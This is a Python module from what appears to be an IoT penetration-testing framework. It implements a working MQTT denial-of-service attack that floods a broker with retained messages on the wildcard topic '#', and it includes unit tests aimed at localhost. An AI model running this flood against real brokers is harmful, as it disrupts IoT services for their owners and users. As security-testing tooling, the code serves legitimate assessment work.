import multiprocessing
import random
import signal
import string
import sys
import logging
import time
import unittest

import paho.mqtt.client as paho

from Entity.attack import Attack
from Entity.input_format import InputFormat
from Utils.RandomUtil import random_generated_names


class MQTTDoSAttack(Attack):
    """
    MQTT Protocol - DoS Attack Module
    This class is used for populating repeated messages aiming to broker
    """
    client = None

    # Input Fields
    host = None
    topic = "#"
    message = None
    username = None
    password = None
    timeout = 0.01
    stopped_flag = False  # This flag will help us for a smooth exit

    # Misc Members
    logger = None
    published_message_count = 0

    def __init__(self):
        default_parameters = ["127.0.0.1", "#", "", "", "", 10.0]
        inputs = [
            InputFormat("Broker Address", "host", "", str, mandatory=True),
            InputFormat("Topic Name", "topic", self.topic, str, mandatory=True),
            InputFormat("Username", "username", "", str, mandatory=True),
            InputFormat("Password", "password", "", str, mandatory=True, secret=True),
            InputFormat("Message", "message", "", str, mandatory=True),
            InputFormat("Timeout", "timeout", self.timeout, float)
        ]

        Attack.__init__(self, "MQTT DoS Attack", inputs, default_parameters,
                        "    We publish messages to MQTT broker.\n"
                        "    The time difference between messages\n"
                        "    can be specified.")

        logging.basicConfig(level=logging.DEBUG, format="%(asctime)s:%(levelname)s:%(name)s:%(message)s")

        # Signal handler to exit from function
        signal.signal(signal.SIGINT, self.signal_handler)

    def signal_handler(self, sig, frame):
        self.stop_attack()

    def stop_attack(self):
        self.logger.info("Published message count: {0}, exitting...".format(self.published_message_count))
        if self.stopped_flag is False:  # Stop the attack
            self.client.loop_stop()
            self.stopped_flag = True
        if self.client is not None:
            self.client.disconnect()  # Close the connection before exitting
        time.sleep(2)  # Sleep two seconds so the user can see the message
        # sys.exit(0)

    def pre_attack_init(self):
        self.client = paho.Client(random_generated_names.get_random_client_name())
        self.client.connect(self.host)

    def run(self):
        Attack.run(self)
        self.pre_attack_init()

        # Start client loop for requests
        self.published_message_count = 0

        self.client.loop_start()

        if self.message is None or len(self.message.strip()) == 0:
            self.message = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(50))
        while self.stopped_flag is False:  # If we don't check this, GUI goes back but a separate thread keeps sending MQTT messages
            try:
                self.published_message_count += 1
                if self.username is None:  # Authentication not required
                    self.client.publish(self.topic, self.message, retain=True)
                    self.logger.info(
                        "Sent message count = {0} with topic = {1}.".format(self.published_message_count, self.topic))
                else:  # Authentication required
                    # TODO Handle authentication after getting inputs
                    self.client.publish(self.topic, self.message, retain=True)
                    self.logger.info(
                        "Sent message count = {0} with topic = {1}.".format(self.published_message_count, self.topic))
                time.sleep(self.timeout)
            except Exception as e:
                self.logger.debug(sys.exc_info()[0])
                break

        self.client.loop_stop()
        self.stopped_flag = True


class TestMQTTDoSAttack(unittest.TestCase):
    def setUp(self):
        self.mqtt_dos_attack = MQTTDoSAttack()

    def tearDown(self):
        pass

    def test_name(self):
        self.assertEqual("MQTT DoS Attack", self.mqtt_dos_attack.get_attack_name())

    def test_inputs(self):
        inputs = self.mqtt_dos_attack.get_inputs()
        self.assertIsNotNone(inputs)
        self.assertGreater(len(inputs), 0, "Non inserted inputs")
        self.assertEquals(len(inputs), 6)

    def test_non_initialized_inputs(self):
        inputs = self.mqtt_dos_attack.get_inputs()
        for _input in inputs:
            value = getattr(self.mqtt_dos_attack, _input.get_name())
            self.assertTrue(value is None or type(value) == _input.get_type())

    def test_after_getting_inputs(self):
        example_inputs = ["a.b.c.d", "peNiOt", "pen-user", "pen-pass", "peniot-payload", 13.2]
        for index, _input in enumerate(example_inputs):
            self.mqtt_dos_attack.inputs[index].set_value(_input)

        # Previously it should not be set
        self.assertIsNone(self.mqtt_dos_attack.client)

        super(MQTTDoSAttack, self.mqtt_dos_attack).run()

        inputs = self.mqtt_dos_attack.get_inputs()
        for index, _input in enumerate(inputs):
            value = getattr(self.mqtt_dos_attack, _input.get_name())
            self.assertEqual(example_inputs[index], value)

    def test_dos_attack(self):
        def run_attack():
            example_inputs = ["127.0.0.1", "peniot/test", None, None, "peniot-pay", 0.01]
            for index, _input in enumerate(example_inputs):
                self.mqtt_dos_attack.inputs[index].set_value(_input)

            self.mqtt_dos_attack.run()

        print "* If server is not initialized this test will not execute properly."
        p = multiprocessing.Process(target=run_attack, name="DoS Attack")
        p.start()
        time.sleep(5)
        if p.is_alive():
            p.terminate()
            p.join()


if __name__ == '__main__':
    unittest.main()
